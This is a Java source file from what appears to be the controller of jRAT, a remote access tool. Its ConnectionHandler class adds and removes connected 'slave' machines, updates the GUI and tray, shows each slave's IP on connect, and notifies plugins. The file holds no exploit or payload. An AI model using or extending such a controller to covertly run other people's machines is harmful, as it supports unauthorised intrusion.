package io.jrat.controller.net;

import io.jrat.controller.AbstractSlave;
import io.jrat.controller.Main;
import io.jrat.controller.SampleMode;
import io.jrat.controller.addons.PluginEventHandler;
import io.jrat.controller.exceptions.CloseException;
import io.jrat.controller.exceptions.DuplicateSlaveException;
import io.jrat.controller.utils.TrayIconUtils;

public class ConnectionHandler {

	public synchronized static void addSlave(AbstractSlave slave) {
		if (slave.isAdded()) {
			slave.disconnect(new DuplicateSlaveException());
		} else {
			slave.setAdded(true);
			Main.connections.add(slave);

			Main.instance.getPanelClients().addSlave(slave);

			String title = Main.formatTitle();
			Main.instance.setTitle(title);

			TrayIconUtils.setToolTip(title);
			TrayIconUtils.showMessage(title, slave.getIP() + " connected");

			PluginEventHandler.onConnect(slave);
		}	
	}

	public synchronized static void removeSlave(AbstractSlave client, Exception e) {
		if (SampleMode.isInSampleMode()) {
			return;
		}

		Main.connections.remove(client);

		String title = Main.formatTitle();
		Main.instance.setTitle(title);
		TrayIconUtils.setToolTip(title);
		client.closeSocket(new CloseException("Removing connection..."));
		
		Main.instance.getPanelClients().removeSlave(client);
	}

}